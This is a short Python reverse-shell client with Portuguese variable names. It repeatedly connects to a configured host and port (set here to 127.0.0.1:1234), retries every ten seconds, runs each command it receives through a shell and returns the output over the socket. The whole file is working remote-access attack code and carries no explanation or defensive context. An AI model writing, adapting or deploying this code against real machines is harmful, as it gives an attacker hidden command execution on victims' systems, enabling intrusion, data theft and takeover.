#!/bin/env python3
# encoding: utf-8

import socket
import subprocess
import os
import time

ip = '127.0.0.1'
porta = 1234

sock = socket.socket()

def teste():
    global sock
    while True:
        try:
            sock = socket.socket()
            sock.connect((ip, porta))
        except socket.error:
            time.sleep(10)
        else: break

teste()

while True:
    try:
        cmd = sock.recv(102400).decode(errors='ignore')
        command = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        resposta = command.communicate()
        if len(resposta[0]) == 0:
            sock.send(b'[!]')
        else:
            sock.send(resposta[0])
    except:
        teste()
        continue

